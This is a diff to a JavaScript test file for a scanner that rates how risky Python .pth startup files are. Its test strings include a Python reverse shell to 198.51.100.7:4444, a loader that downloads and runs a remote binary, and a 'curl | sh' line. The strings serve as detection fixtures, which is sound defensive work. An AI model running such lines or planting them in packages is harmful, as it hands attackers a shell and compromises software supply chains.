@@ -63,7 +63,8 @@ test(".pth files are not source files; BOM and CRLF are handled", () => {
     assert.deepEqual(col.files.map((f) => f.path), ["app.py"]);
     assert.deepEqual(col.pth.map((p) => p.replaceAll("\\", "/")).sort(), ["a.pth", "sub/boot.pth"]);
     const r = scan(d);
-    assert.deepEqual(pth(r.issues), [["a.pth", 1, "MAJOR"], ["a.pth", 3, "CRITICAL"], ["sub/boot.pth", 1, "MAJOR"]]);
+    // (a line that starts another program at every Python start is CRITICAL)
+    assert.deepEqual(pth(r.issues), [["a.pth", 1, "MAJOR"], ["a.pth", 3, "CRITICAL"], ["sub/boot.pth", 1, "CRITICAL"]]);
     assert.deepEqual([...new Set(r.issues.map((i) => i.rule))], ["SC-PTH-EXEC"]);   // no S-OSCMD-PY on it
   } finally { rmSync(d, { recursive: true, force: true }); }
 });
@@ -91,4 +92,28 @@ test("the size cap applies to .pth files", () => {
 test("pthIssues: CRITICAL only when the import line executes or decodes", () => {
   const got = pthIssues("m.pth", "import\tsite\n./a\n  import os\nimport x; y = s.decode('rot13')\nimport os; os.system('\\x69d')\nimport zlib, marshal; marshal.loads(z)\n");
   assert.deepEqual(got.map((i) => [i.line, i.sev]), [[1, "MAJOR"], [4, "CRITICAL"], [5, "CRITICAL"], [6, "CRITICAL"]]);
+});
+
+// coverage's a1_coverage.pth (7.16) runs, through exec() of a plain literal,
+// the multi-line code a .pth line can't hold: the engine (pth_line_risk)
+// judges the literal's code in the call's place. The same shape running a
+// reverse shell (a documentation address; inert) is CRITICAL for what it does.
+const COVERAGE = "import sys; exec('import os\\n\\nif os.getenv(\"COVERAGE_PROCESS_START\") or os.getenv(\"COVERAGE_PROCESS_CONFIG\"):\\n try:\\n  import coverage\\n except:\\n  pass\\n else:\\n  coverage.process_startup(slug=\"pth\")')\n";
+const SHELL = "import os; exec('import socket,subprocess,os;s=socket.socket();s.connect((\"198.51.100.7\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\",\"-i\"])')\n";
+
+test("pthIssues: exec of a plain literal is judged by the code it runs", () => {
+  assert.deepEqual(pthIssues("m.pth", COVERAGE).map((i) => [i.sev, i.msg]), [["MAJOR", ".pth line runs code at every Python start."]]);
+  assert.deepEqual(pthIssues("m.pth", SHELL).map((i) => [i.sev, i.msg]),
+    [["CRITICAL", ".pth line runs code at every Python start, and it reaches the network; and starts another program; and opens a reverse shell."]]);
+  // the worms' .pth files: download Bun, then start it on a script the package ships
+  const loader = "import os as _O,tempfile as _T;_G=_O.path.join(_T.gettempdir(),'.ran');_O.path.exists(_G)or exec('import subprocess as _s,urllib.request as _u\\n_u.urlretrieve(\"https://releases.invalid/b.zip\",\"b.zip\")\\n_s.run([\"b\",\"run\",\"x.js\"],check=False)')\n";
+  assert.deepEqual(pthIssues("m.pth", loader).map((i) => [i.sev, i.msg]),
+    [["CRITICAL", ".pth line runs code at every Python start, and it reaches the network; and starts another program."]]);
+  for (const text of ["import os; exec('\\x69\\x6d\\x70\\x6f\\x72\\x74 os')\n", "import os; exec(r'import os')\n",
+    "import os; exec(b'import os')\n", "import os; exec('import os', g)\n"]) {
+    assert.deepEqual(pthIssues("m.pth", text).map((i) => i.sev), ["CRITICAL"], text);
+  }
+  const curl = pthIssues("m.pth", 'import os; os.system("curl -s http://198.51.100.7/x | sh")\n');
+  assert.equal(curl[0].sev, "CRITICAL");
+  assert.match(curl[0].msg, /pipes a download into a shell/);
 });
